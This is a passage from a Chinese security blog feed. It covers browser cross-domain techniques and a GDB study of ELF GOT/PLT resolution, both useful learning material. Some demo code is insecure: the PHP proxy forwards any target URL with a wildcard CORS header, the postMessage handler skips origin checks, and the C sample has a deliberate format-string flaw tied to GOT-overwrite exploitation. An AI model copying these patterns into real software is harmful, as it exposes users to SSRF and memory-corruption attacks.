class="built_in">console</span>.log(doc.getElementById(<span class="string">'data'</span>).textContent);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://b.0xfa.club/data.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.domain = <span class="string">'0xfa.club'</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"data"</span>&gt;</span>Hello A Site!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过设置双方网站 <code>document.domain</code> 为同一主域，再次访问后，可以看到在访问 <code>http://a.0xfa.club/in.html</code> 页面时，成功获取 <code>http://b.0xfa.club/data.html</code> 中的数据并在调试窗口打印出来。</p><p><img src="/images/articles/2015-09-03-solutions-to-cross-domain-in-browser/2.png" alt=""></p><h3 id="2-iframe结合location-hash进行跨域数据获取"><a href="#2-iframe结合location-hash进行跨域数据获取" class="headerlink" title="2. iframe结合location.hash进行跨域数据获取"></a>2. iframe结合location.hash进行跨域数据获取</h3><p>利用location.hash的变化来传递数据相对来说比较复杂，IE 和 Chrome 的安全机制无法在页面上直接更改父级窗口的 location.hash 值。在网站 A 的页面上创建了 <code>iframe</code> 来加载 网站 B 的页面内容，由于同源策略的关系和浏览器安全机制的关系，网站 B 的JS 脚本不能通过直接修改 <code>parent.location.hash</code>，因为其不同源。</p><p>但是，若再在网站 B 上创建 <code>iframe</code> 加载网站 A 上的一个代理页面，代理页面通过访问 <code>parent.parent</code>，因为代理页面和网站 A 同源，自然而然就能够修改 <code>parent.parent.location.hash</code> 的值了，Demo 代码如下。</p><p><code>http://a.0xfa.club/hash/in.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Site A<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">iframe.style.display = <span class="string">'none'</span>;</span></span><br><span class="line"><span class="javascript">iframe.src = <span class="string">'http://b.0xfa.club/hash/data.html#param'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> checkOut = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> data = location.hash ? location.hash.substring(<span class="number">1</span>) : <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (<span class="built_in">console</span>.log) &#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">'new data is: '</span> + data);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript">  &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">setInterval(checkOut, 2000);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://b.0xfa.club/hash/data.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Site B<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">parent.location.hash = <span class="string">'bsitedata'</span>;</span></span><br><span class="line"><span class="javascript">&#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">ifr.style.display = <span class="string">'none'</span>;</span></span><br><span class="line"><span class="javascript">ifr.src = <span class="string">'http://a.0xfa.club/hash/proxy.html#bsitedata'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(ifr);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://a.0xfa.club/hash/proxy.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">parent.parent.location.hash = self.location.hash.substring(1);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>现在访问 <code>http://a.0xfa.club/hash/in.html</code> 页面时，网站 B 成功的修改了 <code>location.hash</code> 值并被网站 A 捕获，通过调试窗口打印出来。</p><p><img src="/images/articles/2015-09-03-solutions-to-cross-domain-in-browser/3.png" alt=""></p><h3 id="3-通过iframe-name跨域传递数据"><a href="#3-通过iframe-name跨域传递数据" class="headerlink" title="3. 通过iframe.name跨域传递数据"></a>3. 通过iframe.name跨域传递数据</h3><p>由于 <code>iframe</code> 加载后页面可以动态修改其 <code>contentWindow.location</code> 来使得本来不同源的情况下变得同源，而若网站 A 在加载网站 B 的页面 <code>data.html</code> 时，<code>data.html</code> 中设置了 <code>window.name</code> 的值，那么在网站 A 上通过修改 <code>iframe.contentWindow.location</code> 的值使得同源，然后就成功获取到网站 B 传递通过 <code>window.name</code> 传递过来的数据。</p><p><code>http://a.0xfa.club/name/in.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>a.0xfa.club/name/in.html<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> state = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">iframe.src = <span class="string">'http://b.0xfa.club/name/data.html'</span>;</span></span><br><span class="line"><span class="javascript">iframe.style.display = <span class="string">'none'</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> loadfn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (state === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> data = iframe.contentWindow.name;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(data);</span></span><br><span class="line"><span class="javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (state === <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="undefined">state = 1;</span></span><br><span class="line"><span class="javascript">iframe.contentWindow.location = <span class="string">'http://a.0xfa.club'</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">iframe.onload = loadfn;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://b.0xfa.club/name/data.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.name = <span class="string">'content of "b.0xfa.club"'</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问网站 A 的页面 <code>http://a.0xfa.club/name/in.html</code>，页面动态创建 <code>iframe</code> 加载网站 B 的资源 <code>http://b.0xfa.club/name/data.html</code>，而网站 B 的页面将需要传递的数据通过 <code>window.name</code> 进行设置。待动态创建的 <code>iframe</code> 加载完毕后，网站 A 的页面再通过更改 <code>iframe.contentWindow.location</code> 来使得加载的内容符合同源策略，但是此时的 <code>iframe</code> 框的 <code>window.name</code> 值已经被网站 B 上的页面设置过了，所以其值会被设置为 <code>content of &quot;b.0xfa.club&quot;</code>。</p><p><img src="/images/articles/2015-09-03-solutions-to-cross-domain-in-browser/4.png" alt=""></p><h3 id="4-将数据通过-JS-进行直接加载"><a href="#4-将数据通过-JS-进行直接加载" class="headerlink" title="4. 将数据通过 JS 进行直接加载"></a>4. 将数据通过 JS 进行直接加载</h3><p>因为页面可以外部加载 JS 的原因，因此不同源的两个站点可以通过 JS 来进行跨域传递数据。</p><p><code>http://a.0xfa.club/script/in.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://b.0xfa.club/script/data.html"</span> <span class="attr">id</span>=<span class="string">"p"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(data);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://b.0xfa.club/script/data.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">var data = 'b site data';</span><br></pre></td></tr></table></figure><p><img src="/images/articles/2015-09-03-solutions-to-cross-domain-in-browser/5.png" alt=""></p><h3 id="5-html5中的postMessage"><a href="#5-html5中的postMessage" class="headerlink" title="5. html5中的postMessage"></a>5. html5中的postMessage</h3><p>html5 中提供了一个安全跨域传输的 API - postMessage (<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">详细文档</a>)，通过使用 <code>postMessage</code> 可以直接设置 Origin，来达到同源的作用。</p><p><code>http://a.0xfa.club/html5/in.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Html5 postMessage<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"ai"</span> <span class="attr">src</span>=<span class="string">"http://b.0xfa.club/html5/data.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">changeColor</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ifr = <span class="built_in">document</span>.getElementById(<span class="string">'ai'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> targetOrigin = <span class="string">'http://b.0xfa.club'</span>;</span></span><br><span class="line"><span class="javascript">ifr.contentWindow.postMessage(<span class="string">'rgb(0, 255, 0)'</span>, targetOrigin);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">onclick</span>=<span class="string">"changeColor()"</span>&gt;</span>Click here to change "iframe" color<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://b.0xfa.club/html5/data.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Site B<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  body &#123;</span></span><br><span class="line"><span class="undefined">    background-color: rgb(255, 0, 0);</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.style.backgroundColor = event.data;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(event.data);</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里网站 A 的页面通过向内嵌的网站 B 的页面发送新的背景颜色值，网站 B 页面收到新值后修改当前背景颜色。通过这个简单的演示足以说明 html5 中 postMessage 在进行跨域传输时的便捷性。</p><p>点击前：</p><p><img src="/images/articles/2015-09-03-solutions-to-cross-domain-in-browser/6.png" alt=""></p><p>点击后：</p><p><img src="/images/articles/2015-09-03-solutions-to-cross-domain-in-browser/7.png" alt=""></p><h3 id="6-利用-CORS-进行跨域"><a href="#6-利用-CORS-进行跨域" class="headerlink" title="6. 利用 CORS 进行跨域"></a>6. 利用 CORS 进行跨域</h3><p>CORS 名为跨域资源共享（Cross-Origin Resource Sharing），是通过控制网站 B 的相应头部字段来实现的。要实现CORS 必须对被请求的网站 B 做一定的设置，主要就是通过设置相应头中的 <code>Access-Control-Allow-Origin</code> 字段。<code>Access-Control-Allow-Origin</code> 响应字段说明了该资源或网站所允许被非同源站点访问的站点列表，当 <code>Access-Control-Allow-Origin</code> 中包含网站 A 或者设置为 <code>*</code> 时，网站 A 即可对网站 B 上的资源进行任意访问。</p><p>这里网站 B 使用 PHP 来设置 <code>Access-Control-Allow-Origin</code> 响应头字段。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//header("Access-Control-Allow-Origin: *");  //先注释掉，看网站 A 是否能成功请求资源</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Site B PHP resource!!"</span>;</span><br></pre></td></tr></table></figure><p>网站 A 的页面 <code>http://a.0xfa.club/cors/in.html</code> 通过 <code>XMLHttpRequest</code> 来请求网站 B 的页面资源 <code>http://b.0xfa.club/cors/data.php</code>：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xml = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">xml.open(<span class="string">'get'</span>, <span class="string">'http://b.0xfa.club/cors/data.php'</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">xml.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (xml.readyState == <span class="number">4</span> &amp;&amp; xml.status==<span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(xml.responseText);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">xml.send();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>尝试访问，发现在不设置网站 B 页面的响应头字段 <code>Access-Control-Allow-Origin</code>，同样会被同源策略所限制。</p><p><img src="/images/articles/2015-09-03-solutions-to-cross-domain-in-browser/8.png" alt=""></p><p>现在将 <code>//header(&quot;Access-Control-Allow-Origin: *&quot;);</code> 注释一行去掉，再次访问，就能够跨域了。</p><p><img src="/images/articles/2015-09-03-solutions-to-cross-domain-in-browser/9.png" alt=""></p><h2 id="二、网站-B-不可控"><a href="#二、网站-B-不可控" class="headerlink" title="二、网站 B 不可控"></a>二、网站 B 不可控</h2><h3 id="1-代理服务（Proxy）"><a href="#1-代理服务（Proxy）" class="headerlink" title="1. 代理服务（Proxy）"></a>1. 代理服务（Proxy）</h3><p>在网站 B 不可控，即不能设置网站 B 的相关设置时，最有效的方法就是建立中间代理了。</p><p>网站 A 将访问网站 B 的请求通过参数的形式发送给代理服务器（Proxy），代理服务器收到请求后转而去访问网站 B，然后将获取的信息再返回给网站 A，形成一个数据请求回路。</p><pre><code>A  --request-&gt; C --request-&gt;  BA  &lt;-response- C &lt;-response-  B</code></pre><p><code>http://a.0xfa.club/proxy/in.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Proxy Site A<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> proxyUrl = <span class="string">'http://a.0xfa.club/proxy/proxy.php'</span>;</span></span><br><span class="line"><span class="javascript">xhr.open(<span class="string">'post'</span>, proxyUrl, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">xhr.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);</span></span><br><span class="line"><span class="javascript">xhr.send(<span class="string">'method=get&amp;target=http://b.0xfa.club/proxy/data.html&amp;data='</span>);</span></span><br><span class="line"><span class="javascript">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status==<span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(xhr.responseText)</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://b.0xfa.club/proxy/data.html</code> 源码：</p><pre><code>Hello Site A!!</code></pre><p>代理服务代码（可以不与网站 A 同源，设置 <code>Access-Control-Allow-Origin</code> 相应头即可），代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Access-Control-Allow-Origin: *'</span>);</span><br><span class="line"></span><br><span class="line">$method = $_REQUEST[<span class="string">'method'</span>];</span><br><span class="line">$target = $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">$data = $_REQUEST[<span class="string">'data'</span>];</span><br><span class="line"></span><br><span class="line">$curl = curl_init();</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $target);</span><br><span class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($method == <span class="string">'post'</span>) &#123;</span><br><span class="line">curl_setopt($curl, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">curl_setopt($curl, CURLOPT_POSTFIELDS, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">curl_exec($curl);</span><br><span class="line">curl_close($curl);</span><br></pre></td></tr></table></figure><p>具体参数接口可根据需求进行设定，该方法的好处就是灵活，定制型高，缺点就是需要自行构建代理服务。（上面代理代码小心测试，有漏洞噢！）</p><p><img src="/images/articles/2015-09-03-solutions-to-cross-domain-in-browser/10.png" alt=""></p><h3 id="记在最后"><a href="#记在最后" class="headerlink" title="记在最后"></a>记在最后</h3><p>当然，上面所列出的这些跨域姿势并不是全部（还有 Flash 等），并不是每个都那么的好用和灵活，不同的项目有不同的需求，跨域方法需要根据实际需求进行调整和变换。：）</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html" target="_blank" rel="noopener">http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://baike.baidu.com/view/3747010.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;同源策略&lt;/a&gt;-是针对浏览器所设计的一项安全规定，页面中所渲染的资源（JavaScript脚本除外）都需要符合
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>通过 GDB 调试理解 GOT/PLT</title>
    <link href="http://rickgray.me/2015/08/07/use-gdb-to-study-got-and-plt/"/>
    <id>http://rickgray.me/2015/08/07/use-gdb-to-study-got-and-plt/</id>
    <published>2015-08-06T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.517Z</updated>
    
    <content type="html"><![CDATA[<p>关于 Linux 中 ELF 文件格式可参考详细文档<a href="http://flint.cs.yale.edu/cs422/doc/ELF_Format.pdf" target="_blank" rel="noopener">《ELF_Format》</a>，本文仅记录笔者理解GOT/PLT的过程。</p><p>GOT（Global Offset Table）：全局偏移表用于记录在 ELF 文件中所用到的共享库中符号的绝对地址。在程序刚开始运行时，GOT 表项是空的，当符号第一次被调用时会动态解析符号的绝对地址然后转去执行，并将被解析符号的绝对地址记录在 GOT 中，第二次调用同一符号时，由于 GOT 中已经记录了其绝对地址，直接转去执行即可（不用重新解析）。</p><p>PLT（Procedure Linkage Table）：过程链接表的作用是将位置无关的符号转移到绝对地址。当一个外部符号被调用时，PLT 去引用 GOT 中的其符号对应的绝对地址，然后转入并执行。</p><p>GOT 位于 <code>.got.plt</code> section 中，而 PLT 位于 <code>.plt</code> section中。下面给出一示例程序：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"argv[1] required!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You input: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Down\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译该程序：</p><pre><code>gcc -o format format.c</code></pre><p>然后我们通过 <code>readelf</code> 命令来查看 <code>format</code> 程序的 sectioin 信息，并检查 GOT：</p><p><img src="/images/articles/2015-08-07-use-gdb-to-study-got-and-plt/got-1.png" alt=""></p><p>从上图可看到，该 ELF 文件共包含29个 section，有关 GOT 的重定向：</p><p><img src="/images/articles/2015-08-07-use-gdb-to-study-got-and-plt/got-2.png" alt=""></p><p><code>.rel.dyn</code> 记录了加载时需要重定位的变量，<code>.rel.plt</code> 记录的是需要重定位的函数。</p><p>接下来，我们使用 <code>gdb</code> 来对程序进行调试，观察程序在调用 <code>printf()</code> 函数时，GOT 的变化情况。</p><p>因为程序逻辑需要输入参数，设置好参数后，在主函数处下断点，然后运行，单步调试来到 <code>printf()</code> 函数调用的地方：</p><p><img src="/images/articles/2015-08-07-use-gdb-to-study-got-and-plt/got-3.png" alt=""></p><p>这里可以看到在 <code>0x080484ab</code> 处指令为：</p><pre><code>call 0x8048330 &lt;printf@plt&gt;</code></pre><p>然后查看一下 <code>0x8048330</code> 处的代码：</p><p><img src="/images/articles/2015-08-07-use-gdb-to-study-got-and-plt/got-4.png" alt=""></p><p>可以看到流程会跳转到 <code>ds[0x804a00c]</code> 处，而 <code>0x804a00c</code> 是 <code>printf()</code> 重定位偏移（查看上面 GOT 信息图），接着看一下后面的流程都做了什么：</p><p><img src="/images/articles/2015-08-07-use-gdb-to-study-got-and-plt/got-5.png" alt=""></p><p>根据上面的流程分析，进行单步调试，当动态解析（_dl_runtime_resolve）完成后，流程会直接跳转到 <code>printf()</code> 函数主体：</p><p><img src="/images/articles/2015-08-07-use-gdb-to-study-got-and-plt/got-6.png" alt=""></p><p>上面我们说过，当第一次调用符号时会动态解析其绝对地址并写到 GOT 中，下次调用的时候就不用再次解析了，我们来看看这个时候原先 <code>0x804a00c</code> 处的指向情况：</p><p><img src="/images/articles/2015-08-07-use-gdb-to-study-got-and-plt/got-7.png" alt=""></p><p>其所指向的地址正好为第一次解析后得到的 <code>printf()</code> 函数的入口地址。</p><p>程序中，<code>printf()</code> 函数的调用过程可以总结为：</p><p><img src="/images/articles/2015-08-07-use-gdb-to-study-got-and-plt/got-8.png" alt=""></p><p>总结来说就是，GOT 保存了程序中所要调用的函数的地址，运行一开时其表项为空，会在运行时实时的更新表项。一个符号调用在第一次时会解析出绝对地址更新到 GOT 中，第二次调用时就直接找到 GOT 表项所存储的函数地址直接调用了。</p><p>（清楚上述动态解析的过程，有助于理解GOT覆写利用）</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://blog.csdn.net/anzhsoft/article/details/18776111" target="_blank" rel="noopener">http://blog.csdn.net/anzhsoft/article/details/18776111</a></li><li><a 